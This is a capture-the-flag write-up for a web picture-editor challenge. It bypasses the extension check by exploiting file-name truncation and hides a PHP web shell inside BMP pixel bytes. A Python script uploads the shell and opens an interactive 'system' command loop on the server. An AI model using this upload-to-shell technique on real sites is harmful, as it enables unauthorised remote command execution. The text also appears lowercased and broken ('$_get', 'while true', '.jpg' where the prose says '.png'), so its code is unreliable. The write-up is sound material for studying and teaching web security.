# pixeditor (web)

in the task we get access to a web-based picture editor.
we can draw a small image by setting pixel colors and then save it on the server as jpg, png, bmp or gif under given filename.

there is a check for the file extension when saving the file, however the name is truncated to 50 characters after the extension check.
so we can use name ending with `.png` to pass the check, but if the name is too long, this extension will be cut.
using this trick we can save a `.php` file by using name in format `'x'*46+'.php.png`.

now we would like to place some php code inside the file, but we can only draw some pixels.
fortunately php interpreters are permissive, and they will execute anything which looks like valid php code.
so we can have some random bytes before and after php code in the file, and it will still work.

we need to paint a picture where bytes will create code we want.
the easiest option is to use bmp because pixels simply go into the file directly as bgr color values.
web editor includes also alpha channel, so we actually have 32x32x4 bytes, and we want to skip every 4th byte, because it won't appear in the output file.
also the bytes in bmp are inverted, because the web editor format is rgba and bmp has bgr.

the solution is to split the payload `<?php $_get['a']($_get['b']); ?>` into 3-bytes long chunks, and place then in consecutive picture pixels inverted:

```python
import re
import requests
from crypto_commons.generic import chunk


def shell(url):
    while true:
        b = raw_input("> ")
        print(requests.get(url + "?a=system&b=" + b).text[3030:])


def pad(plain):
    missing = 3 - len(plain) % 3
    return plain + (" " * missing)


def create_shell(main_url):
    data = [1 for _ in range(32 * 32 * 4)]
    index = 0
    for c in chunk(pad("<?php $_get['a']($_get['b']); ?>"), 3):
        data[index + 2] = ord(c[0])  # r
        data[index + 1] = ord(c[1])  # g
        data[index] = ord(c[2])  # b
        index += 4
    url = main_url + "save.php"
    name = "a" * 46 + ".php"
    r = requests.post(url, data={"data": str(data), "name": name + ".jpg", "format": "bmp"})
    link = re.findall("<a href='(.*)'>download", r.text)[0]
    return link


def main():
    main_url = "http://pixeditor.challs.malice.fr/"
    link = create_shell(main_url)
    print(main_url + link)
    shell(main_url + link)


main()
```

with such shell we can just find the flag in `/` and cat it to get `ndh{msp4int.3x3>all>th3g1mp}`
